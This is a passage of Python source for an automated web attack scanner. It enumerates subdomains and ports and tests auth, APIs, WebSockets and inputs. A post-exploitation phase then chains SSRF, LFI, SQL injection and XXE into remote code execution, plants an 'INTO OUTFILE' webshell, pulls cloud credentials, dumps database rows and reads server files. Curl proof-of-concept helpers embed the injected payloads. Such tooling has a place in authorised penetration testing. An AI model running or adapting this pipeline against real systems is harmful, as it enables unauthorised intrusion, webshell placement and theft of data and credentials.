            domain = parsed.netloc
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # === RECON MODULE ===
            if not self.stop_requested.get(scan_id):
                self._log_event(session, "recon", "Running advanced reconnaissance...")
                add_detailed_log("recon", "Starting reconnaissance", {"target": domain})
                try:
                    recon = ReconScanner()
                    recon_data = {"subdomains": [], "ports": [], "technologies": [], "wayback_urls": []}

                    # Subdomain enumeration
                    subdomains = await recon.enumerate_subdomains(domain)
                    if subdomains:
                        self._log_event(session, "recon", f"Found {len(subdomains)} subdomains")
                        recon_data["subdomains"] = subdomains
                        session.endpoints_discovered.extend([f"https://{s}" for s in subdomains[:10]])
                        add_detailed_log("recon", "Subdomains enumerated", {"count": len(subdomains), "subdomains": subdomains[:20]})

                    # Port scanning on main domain
                    ports = await recon.scan_ports(domain)
                    if ports:
                        self._log_event(session, "recon", f"Open ports: {ports}")
                        recon_data["ports"] = ports
                        add_detailed_log("recon", "Port scan completed", {"ports": ports})

                    # Save recon results to session
                    session.recon_results = recon_data
                    session.module_results["recon"] = {
                        "status": "completed",
                        "subdomains_found": len(subdomains) if subdomains else 0,
                        "ports_found": len(ports) if ports else 0,
                        "data": recon_data
                    }

                    await recon.close()
                except Exception as e:
                    logger.warning(f"Recon module error: {e}")
                    add_detailed_log("recon", "Error", {"error": str(e)}, "error")

            # === AUTH TESTING MODULE ===
            if not self.stop_requested.get(scan_id):
                self._log_event(session, "auth", "Testing authentication security...")
                add_detailed_log("auth", "Starting authentication tests", {"target": target_url})
                try:
                    auth_tester = AuthTester(self.session)
                    auth_tests_run = []

                    # Test session fixation
                    add_detailed_log("auth", "Testing session fixation")
                    await auth_tester.test_session_fixation(target_url)
                    auth_tests_run.append("session_fixation")

                    # Test cookie security
                    add_detailed_log("auth", "Testing cookie security")
                    await auth_tester.test_cookie_security(target_url)
                    auth_tests_run.append("cookie_security")

                    # Convert findings
                    auth_findings_count = 0
                    for af in auth_tester.findings:
                        finding = Finding(
                            id=self._generate_id(),
                            vuln_type=af.vuln_type,
                            severity=Severity[af.severity.upper()] if hasattr(Severity, af.severity.upper()) else Severity.MEDIUM,
                            url=af.url,
                            parameter=None,
                            payload="",
                            evidence=af.evidence,
                            description=af.description,
                            poc=af.poc
                        )
                        session.findings.append(finding)
                        self._log_event(session, "auth", f"FOUND: {af.vuln_type}")
                        add_detailed_log("auth", "Vulnerability found", {"type": af.vuln_type, "url": af.url}, "vulnerability")
                        auth_findings_count += 1

                    session.module_results["auth"] = {
                        "status": "completed",
                        "tests_run": auth_tests_run,
                        "findings_count": auth_findings_count
                    }
                except Exception as e:
                    logger.warning(f"Auth testing error: {e}")
                    add_detailed_log("auth", "Error", {"error": str(e)}, "error")

            # === API SECURITY MODULE ===
            if not self.stop_requested.get(scan_id):
                self._log_event(session, "api", "Testing API security...")
                add_detailed_log("api", "Starting API security tests", {"target": target_url})
                try:
                    api_tester = APISecurityTester(self.session)

                    # Discover API endpoints
                    api_endpoints = await api_tester.discover_api_endpoints(target_url)
                    discovered_endpoints = []
                    if api_endpoints:
                        self._log_event(session, "api", f"Found {len(api_endpoints)} API endpoints")
                        discovered_endpoints = [str(ep) for ep in api_endpoints[:20]]
                        add_detailed_log("api", "API endpoints discovered", {"count": len(api_endpoints), "endpoints": discovered_endpoints})

                    # Test for BOLA/IDOR
                    for endpoint in api_endpoints[:5]:  # Limit to first 5
                        add_detailed_log("api", "Testing BOLA/IDOR", {"endpoint": str(endpoint)})
                        await api_tester.test_bola(endpoint)

                    # Convert findings
                    api_findings_count = 0
                    for af in api_tester.findings:
                        finding = Finding(
                            id=self._generate_id(),
                            vuln_type=af.vuln_type,
                            severity=Severity[af.severity.upper()] if hasattr(Severity, af.severity.upper()) else Severity.HIGH,
                            url=af.url,
                            parameter=af.parameter if hasattr(af, 'parameter') else None,
                            payload=af.payload if hasattr(af, 'payload') else "",
                            evidence=af.evidence,
                            description=af.description,
                            poc=af.poc
                        )
                        session.findings.append(finding)
                        self._log_event(session, "api", f"FOUND: {af.vuln_type}")
                        add_detailed_log("api", "Vulnerability found", {"type": af.vuln_type, "url": af.url}, "vulnerability")
                        api_findings_count += 1

                    session.module_results["api"] = {
                        "status": "completed",
                        "endpoints_discovered": len(api_endpoints) if api_endpoints else 0,
                        "endpoints_tested": min(5, len(api_endpoints)) if api_endpoints else 0,
                        "findings_count": api_findings_count,
                        "endpoints_list": discovered_endpoints
                    }
                except Exception as e:
                    logger.warning(f"API security error: {e}")
                    add_detailed_log("api", "Error", {"error": str(e)}, "error")

            # === WEBSOCKET TESTING ===
            if not self.stop_requested.get(scan_id):
                add_detailed_log("websocket", "Starting WebSocket testing", {"base_url": base_url})
                # Check for WebSocket endpoints
                ws_paths = ["/ws", "/websocket", "/socket.io", "/sockjs"]
                ws_endpoints_found = []
                ws_findings_count = 0
                for ws_path in ws_paths:
                    ws_url = f"{base_url}{ws_path}"
                    try:
                        ws_tester = WebSocketTester()
                        if await ws_tester.check_websocket_exists(ws_url):
                            ws_endpoints_found.append(ws_url)
                            self._log_event(session, "websocket", f"Testing WebSocket at {ws_url}")
                            add_detailed_log("websocket", "WebSocket endpoint found", {"url": ws_url})
                            await ws_tester.test_auth_bypass(ws_url)

                            for wf in ws_tester.findings:
                                finding = Finding(
                                    id=self._generate_id(),
                                    vuln_type=wf.vuln_type,
                                    severity=Severity.HIGH,
                                    url=ws_url,
                                    parameter=None,
                                    payload="",
                                    evidence=wf.evidence,
                                    description=wf.description,
                                    poc=wf.poc
                                )
                                session.findings.append(finding)
                                self._log_event(session, "websocket", f"FOUND: {wf.vuln_type}")
                                add_detailed_log("websocket", "Vulnerability found", {"type": wf.vuln_type, "url": ws_url}, "vulnerability")
                                ws_findings_count += 1
                        await ws_tester.close()
                    except Exception as e:
                        logger.debug(f"WebSocket test error for {ws_path}: {e}")
                        add_detailed_log("websocket", "Test error", {"path": ws_path, "error": str(e)}, "warning")

                session.module_results["websocket"] = {
                    "status": "completed",
                    "paths_checked": ws_paths,
                    "endpoints_found": ws_endpoints_found,
                    "findings_count": ws_findings_count
                }

            # === FUZZING (light) ===
            if not self.stop_requested.get(scan_id) and session.endpoints_discovered:
                self._log_event(session, "fuzz", "Running light fuzzing...")
                add_detailed_log("fuzz", "Starting fuzzing", {"endpoints_to_fuzz": len(session.endpoints_discovered[:3])})
                try:
                    fuzzer = AdvancedFuzzer(self.session)
                    fuzz_results = []
                    interesting_count = 0

                    # Fuzz first discovered endpoint with params
                    for endpoint in session.endpoints_discovered[:3]:
                        parsed_ep = urllib.parse.urlparse(endpoint)
                        if parsed_ep.query:
                            add_detailed_log("fuzz", "Fuzzing endpoint", {"endpoint": endpoint})
                            results = await fuzzer.fuzz_endpoint(endpoint, max_iterations=20)
                            for fr in results:
                                if fr.is_interesting:
                                    self._log_event(session, "fuzz", f"Interesting response at {endpoint}")
                                    add_detailed_log("fuzz", "Interesting response", {
                                        "endpoint": endpoint,
                                        "status_code": fr.status_code if hasattr(fr, 'status_code') else None
                                    }, "interesting")
                                    interesting_count += 1
                                    fuzz_results.append({
                                        "endpoint": endpoint,
                                        "status": "interesting",
                                        "payload": fr.payload if hasattr(fr, 'payload') else None
                                    })

                    session.module_results["fuzzer"] = {
                        "status": "completed",
                        "endpoints_fuzzed": min(3, len(session.endpoints_discovered)),
                        "interesting_responses": interesting_count,
                        "results": fuzz_results[:20]
                    }
                except Exception as e:
                    logger.warning(f"Fuzzing error: {e}")
                    add_detailed_log("fuzz", "Error", {"error": str(e)}, "error")

            session.progress = 92

            # === EXTERNAL API ENRICHMENT ===
            if not self.stop_requested.get(scan_id):
                self._log_event(session, "enrich", "Running external API enrichment...")
                add_detailed_log("enrichment", "Starting external API enrichment", {"target": target_url})
                try:
                    from app.services.external_apis import get_external_apis

                    apis = get_external_apis()
                    enrichments = await apis.enrich_target(target_url)

                    for enrichment in enrichments:
                        self._log_event(
                            session, "enrich",
                            f"[{enrichment.source}] Retrieved {len(enrichment.data)} data points"
                        )
                        # Save enrichment to session
                        session.enrichments.append({
                            "source": enrichment.source,
                            "timestamp": enrichment.timestamp,
                            "data": enrichment.data
                        })
                        add_detailed_log("enrichment", f"Data from {enrichment.source}", enrichment.data)

                        # Add interesting findings from enrichment
                        if enrichment.source == "shodan" and enrichment.data.get("vulns"):
                            for vuln in enrichment.data["vulns"][:3]:
                                self._log_event(session, "enrich", f"Shodan CVE: {vuln}")

                        if enrichment.source == "virustotal":
                            malicious = enrichment.data.get("malicious", 0)
                            if malicious > 0:
                                self._log_event(session, "enrich", f"VirusTotal: {malicious} malicious detections!")
                                add_detailed_log("enrichment", "VirusTotal alert", {"malicious": malicious}, "warning")

                        if enrichment.source == "abuseipdb":
                            score = enrichment.data.get("abuse_score", 0)
                            if score > 50:
                                self._log_event(session, "enrich", f"AbuseIPDB: High abuse score ({score}%)")
                                add_detailed_log("enrichment", "AbuseIPDB alert", {"abuse_score": score}, "warning")

                    await apis.close()
                except Exception as e:
                    logger.debug(f"Enrichment error: {e}")
                    add_detailed_log("enrichment", "Error", {"error": str(e)}, "error")

            # === LLM ANALYSIS ===
            if not self.stop_requested.get(scan_id) and session.findings:
                self._log_event(session, "llm", "Running LLM analysis on findings...")
                add_detailed_log("llm", "Starting LLM analysis", {"findings_count": len(session.findings)})
                try:
                    from app.services.llm_service import get_llm_service

                    llm = get_llm_service()
                    if await llm.is_available():
                        # Analyze top findings
                        for finding in session.findings[:5]:  # Limit to first 5
                            analysis = await llm.analyze_vulnerability(finding.to_dict())
                            if analysis:
                                session.llm_analyses.append({
                                    "finding_id": finding.id,
                                    "vuln_type": finding.vuln_type,
                                    "analysis": analysis,
                                    "timestamp": datetime.now().isoformat()
                                })
                                add_detailed_log("llm", f"Analysis for {finding.vuln_type}", {"analysis": analysis[:200]})
                                self._log_event(session, "llm", f"Analyzed: {finding.vuln_type}")

                        # Generate report summary
                        summary = await llm.generate_report_summary([f.to_dict() for f in session.findings])
                        if summary:
                            session.llm_analyses.append({
                                "type": "executive_summary",
                                "summary": summary,
                                "timestamp": datetime.now().isoformat()
                            })
                            add_detailed_log("llm", "Executive summary generated", {"summary": summary})

                        await llm.close()
                    else:
                        add_detailed_log("llm", "LLM not available", None, "info")
                except Exception as e:
                    logger.debug(f"LLM analysis error: {e}")
                    add_detailed_log("llm", "Error", {"error": str(e)}, "error")

            # === POST-EXPLOITATION ===
            if not self.stop_requested.get(scan_id) and session.findings:
                await self._run_post_exploitation(session, target_url, add_detailed_log)

            session.progress = 95
            self._log_event(session, "advanced", "Advanced modules completed")
            add_detailed_log("summary", "All advanced modules completed", {
                "total_findings": len(session.findings),
                "enrichments": len(session.enrichments),
                "modules_run": list(session.module_results.keys()),
                "post_exploitation": session.module_results.get("post_exploitation", {})
            })

        except ImportError as e:
            logger.warning(f"Could not import advanced modules: {e}")
        except Exception as e:
            logger.warning(f"Advanced modules error: {e}")

    async def _run_post_exploitation(self, session: ScanSession, target_url: str, add_detailed_log):
        """
        Post-exploitation phase:
        - Chain exploits for maximum impact
        - Extract data from confirmed vulnerabilities
        - Attempt privilege escalation paths
        """
        scan_id = session.scan_id
        self._log_event(session, "post-exploit", "Starting post-exploitation phase...")
        add_detailed_log("post-exploit", "Starting post-exploitation", {"findings_count": len(session.findings)})

        post_results = {
            "chains_attempted": [],
            "chains_successful": [],
            "data_extracted": [],
            "total_extractions": 0
        }

        try:
            # Import post-exploitation modules
            from app.modules.chain_exploits import ChainExploiter
            from app.autonomous_exploiter import AutonomousExploiter

            chain_exploiter = ChainExploiter(self.session)
            auto_exploiter = AutonomousExploiter()
            await auto_exploiter.initialize()

            # Group findings by type for targeted post-exploitation
            sqli_findings = [f for f in session.findings if 'sql' in f.vuln_type.lower()]
            lfi_findings = [f for f in session.findings if 'lfi' in f.vuln_type.lower() or 'path' in f.vuln_type.lower()]
            ssrf_findings = [f for f in session.findings if 'ssrf' in f.vuln_type.lower()]
            xxe_findings = [f for f in session.findings if 'xxe' in f.vuln_type.lower()]
            rce_findings = [f for f in session.findings if 'rce' in f.vuln_type.lower() or 'command' in f.vuln_type.lower()]

            # === CHAIN EXPLOITS ===
            # Try SSRF -> RCE chains
            for finding in ssrf_findings[:2]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Attempting SSRF->RCE chain on {finding.url}")
                    add_detailed_log("post-exploit", "Attempting SSRF->RCE chain", {"url": finding.url, "param": finding.parameter})

                    chain = await chain_exploiter.chain_ssrf_to_rce(finding.url, finding.parameter)
                    post_results["chains_attempted"].append("SSRF->RCE")

                    if chain and chain.success:
                        post_results["chains_successful"].append({
                            "name": chain.name,
                            "steps": [{"name": s.name, "success": s.success, "result": s.result} for s in chain.steps],
                            "impact": chain.final_impact,
                            "poc": chain.poc
                        })
                        self._log_event(session, "post-exploit", f"SUCCESS: {chain.name}")
                        add_detailed_log("post-exploit", "Chain successful", {"chain": chain.name, "impact": chain.final_impact}, "vulnerability")

                        # Add as critical finding
                        chain_finding = Finding(
                            id=self._generate_id(),
                            vuln_type=f"Chained: {chain.name}",
                            severity=Severity.CRITICAL,
                            url=finding.url,
                            parameter=finding.parameter,
                            payload="Multiple payloads - see PoC",
                            evidence=chain.final_impact,
                            description=f"Successful exploitation chain: {chain.name}",
                            poc=chain.poc,
                            timeline=[ExploitStep(
                                step=i+1,
                                action=s.name,
                                timestamp=datetime.now().isoformat(),
                                success=s.success,
                                note=s.result
                            ) for i, s in enumerate(chain.steps)]
                        )
                        session.findings.append(chain_finding)
                except Exception as e:
                    logger.debug(f"SSRF chain error: {e}")
                    add_detailed_log("post-exploit", "Chain error", {"error": str(e)}, "error")

            # Try LFI -> RCE chains
            for finding in lfi_findings[:2]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Attempting LFI->RCE chain on {finding.url}")
                    add_detailed_log("post-exploit", "Attempting LFI->RCE chain", {"url": finding.url})

                    chain = await chain_exploiter.chain_lfi_to_rce(finding.url, finding.parameter)
                    post_results["chains_attempted"].append("LFI->RCE")

                    if chain and chain.success:
                        post_results["chains_successful"].append({
                            "name": chain.name,
                            "steps": [{"name": s.name, "success": s.success} for s in chain.steps],
                            "impact": chain.final_impact,
                            "poc": chain.poc
                        })
                        self._log_event(session, "post-exploit", f"SUCCESS: {chain.name}")
                        add_detailed_log("post-exploit", "Chain successful", {"chain": chain.name}, "vulnerability")

                        chain_finding = Finding(
                            id=self._generate_id(),
                            vuln_type=f"Chained: {chain.name}",
                            severity=Severity.CRITICAL,
                            url=finding.url,
                            parameter=finding.parameter,
                            payload="Log poisoning payload",
                            evidence=chain.final_impact,
                            description=f"Successful exploitation chain: {chain.name}",
                            poc=chain.poc
                        )
                        session.findings.append(chain_finding)
                except Exception as e:
                    logger.debug(f"LFI chain error: {e}")

            # Try SQLi -> RCE chains
            for finding in sqli_findings[:2]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Attempting SQLi->RCE chain on {finding.url}")
                    add_detailed_log("post-exploit", "Attempting SQLi->RCE chain", {"url": finding.url})

                    chain = await chain_exploiter.chain_sqli_to_rce(finding.url, finding.parameter)
                    post_results["chains_attempted"].append("SQLi->RCE")

                    if chain and chain.success:
                        post_results["chains_successful"].append({
                            "name": chain.name,
                            "steps": [{"name": s.name, "success": s.success} for s in chain.steps],
                            "impact": chain.final_impact,
                            "poc": chain.poc
                        })
                        self._log_event(session, "post-exploit", f"SUCCESS: {chain.name}")

                        chain_finding = Finding(
                            id=self._generate_id(),
                            vuln_type=f"Chained: {chain.name}",
                            severity=Severity.CRITICAL,
                            url=finding.url,
                            parameter=finding.parameter,
                            payload="INTO OUTFILE webshell",
                            evidence=chain.final_impact,
                            description=f"Successful exploitation chain: {chain.name}",
                            poc=chain.poc
                        )
                        session.findings.append(chain_finding)
                except Exception as e:
                    logger.debug(f"SQLi chain error: {e}")

            # Try XXE -> Cloud chains
            for finding in xxe_findings[:2]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Attempting XXE->Cloud chain on {finding.url}")

                    chain = await chain_exploiter.chain_xxe_to_cloud(finding.url)
                    post_results["chains_attempted"].append("XXE->Cloud")

                    if chain and chain.success:
                        post_results["chains_successful"].append({
                            "name": chain.name,
                            "impact": chain.final_impact,
                            "poc": chain.poc
                        })
                        self._log_event(session, "post-exploit", f"SUCCESS: {chain.name}")

                        chain_finding = Finding(
                            id=self._generate_id(),
                            vuln_type=f"Chained: {chain.name}",
                            severity=Severity.CRITICAL,
                            url=finding.url,
                            parameter=None,
                            payload="XXE SSRF to cloud metadata",
                            evidence=chain.final_impact,
                            description=f"Cloud credentials extracted via XXE",
                            poc=chain.poc
                        )
                        session.findings.append(chain_finding)
                except Exception as e:
                    logger.debug(f"XXE chain error: {e}")

            # === DATA EXTRACTION ===
            # Extract data from SQL injections
            for finding in sqli_findings[:3]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Extracting data via SQLi from {finding.url}")
                    add_detailed_log("post-exploit", "Starting SQLi data extraction", {"url": finding.url})

                    exploit_session = await auto_exploiter.exploit_target(
                        finding.url,
                        extract_data=True,
                        max_extraction_rows=50
                    )

                    if exploit_session and exploit_session.extractions:
                        for extraction in exploit_session.extractions:
                            extracted_info = {
                                "vuln_type": extraction.vuln_type,
                                "source_url": finding.url,
                                "tables": list(extraction.data_extracted.get("tables", []))[:10],
                                "columns": {k: v[:5] for k, v in extraction.data_extracted.get("columns", {}).items()},
                                "sample_data": {k: v[:3] for k, v in extraction.data_extracted.get("data", {}).items()},
                                "db_info": extraction.data_extracted.get("database_info", {})
                            }
                            post_results["data_extracted"].append(extracted_info)
                            post_results["total_extractions"] += 1

                            self._log_event(session, "post-exploit",
                                f"Extracted: {len(extracted_info.get('tables', []))} tables, "
                                f"{len(extracted_info.get('columns', {}))} column sets")
                            add_detailed_log("post-exploit", "Data extracted via SQLi", extracted_info, "interesting")

                            # Update the finding with extracted data
                            finding.extracted_data = finding.extracted_data or {}
                            finding.extracted_data.update(extracted_info)
                except Exception as e:
                    logger.debug(f"SQLi extraction error: {e}")
                    add_detailed_log("post-exploit", "Extraction error", {"error": str(e)}, "error")

            # Extract files via LFI
            for finding in lfi_findings[:3]:
                if self.stop_requested.get(scan_id):
                    break
                try:
                    self._log_event(session, "post-exploit", f"Extracting files via LFI from {finding.url}")
                    add_detailed_log("post-exploit", "Starting LFI file extraction", {"url": finding.url})

                    exploit_session = await auto_exploiter.exploit_target(
                        finding.url,
                        extract_data=True
                    )

                    if exploit_session and exploit_session.extractions:
                        for extraction in exploit_session.extractions:
                            files_extracted = extraction.data_extracted.get("files_extracted", {})
                            if files_extracted:
                                extracted_info = {
                                    "vuln_type": "LFI",
                                    "source_url": finding.url,
                                    "files": list(files_extracted.keys()),
                                    "file_previews": {k: v[:500] for k, v in files_extracted.items()}
                                }
                                post_results["data_extracted"].append(extracted_info)
                                post_results["total_extractions"] += 1

                                self._log_event(session, "post-exploit",
                                    f"Extracted {len(files_extracted)} files via LFI")
                                add_detailed_log("post-exploit", "Files extracted via LFI", {
                                    "files": list(files_extracted.keys())
                                }, "interesting")

                                finding.extracted_data = finding.extracted_data or {}
                                finding.extracted_data["files_extracted"] = list(files_extracted.keys())
                except Exception as e:
                    logger.debug(f"LFI extraction error: {e}")

            # Save post-exploitation results
            session.module_results["post_exploitation"] = post_results

            # Summary
            chains_success = len(post_results["chains_successful"])
            extractions = post_results["total_extractions"]
            self._log_event(session, "post-exploit",
                f"Post-exploitation complete: {chains_success} chains, {extractions} extractions")
            add_detailed_log("post-exploit", "Post-exploitation completed", {
                "chains_attempted": len(post_results["chains_attempted"]),
                "chains_successful": chains_success,
                "data_extractions": extractions
            })

        except ImportError as e:
            logger.warning(f"Post-exploitation modules not available: {e}")
            add_detailed_log("post-exploit", "Modules not available", {"error": str(e)}, "warning")
        except Exception as e:
            logger.warning(f"Post-exploitation error: {e}")
            add_detailed_log("post-exploit", "Error", {"error": str(e)}, "error")

    def stop_scan(self, scan_id: str):
        """Request scan stop"""
        self.stop_requested[scan_id] = True

    def get_session(self, scan_id: str) -> Optional[ScanSession]:
        return self.sessions.get(scan_id)

    def get_session_status(self, scan_id: str) -> Optional[Dict]:
        session = self.sessions.get(scan_id)
        if not session:
            return None
        return {
            "scan_id": scan_id,
            "phase": session.phase.value,
            "progress": session.progress,
            "findings_count": len(session.findings),
            "requests": session.total_requests,
            "events": session.events[-50:],
            "technologies": session.technologies,
            "endpoints_count": len(session.endpoints_discovered),
            "enrichments_count": len(session.enrichments),
            "module_results_count": len(session.module_results),
            "llm_analyses_count": len(session.llm_analyses),
            "errors": session.errors[-10:] if session.errors else []
        }

    # ==================== HELPERS ====================

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        query[param] = [payload]
        new_query = urllib.parse.urlencode(query, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _gen_sqli_poc(self, url, param, payload):
        return f"""# SQL Injection
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_xss_poc(self, url, param, payload):
        return f"""# Cross-Site Scripting
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_lfi_poc(self, url, param, payload):
        return f"""# Local File Inclusion
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_ssti_poc(self, url, param, payload):
        return f"""# Server-Side Template Injection
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_ssrf_poc(self, url, param, payload):
        return f"""# Server-Side Request Forgery
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_rce_poc(self, url, param, payload):
        return f"""# Remote Code Execution
Target: {url}
Parameter: {param}
Payload: {payload}

curl "{self._inject_param(url, param, payload)}"
"""

    def _gen_xxe_poc(self, url, payload):
        return f"""# XML External Entity Injection
Target: {url}

curl -X POST "{url}" -H "Content-Type: application/xml" -d '{payload}'
"""

    def _gen_nosql_poc(self, url, param, payload):
        return f"""# NoSQL Injection
Target: {url}
Parameter: {param}

curl -X POST "{url}" -H "Content-Type: application/json" -d '{{"{param}": {payload}}}'
"""

    def _gen_graphql_poc(self, url, payload):
        return f"""# GraphQL Introspection
Target: {url}

curl -X POST "{url}" -H "Content-Type: application/json" -d '{payload}'
"""


# Global instance
_scanner: Optional[UnifiedScanner] = None


def get_unified_scanner() -> UnifiedScanner:
    global _scanner
    if _scanner is None:
        _scanner = UnifiedScanner()
    return _scanner
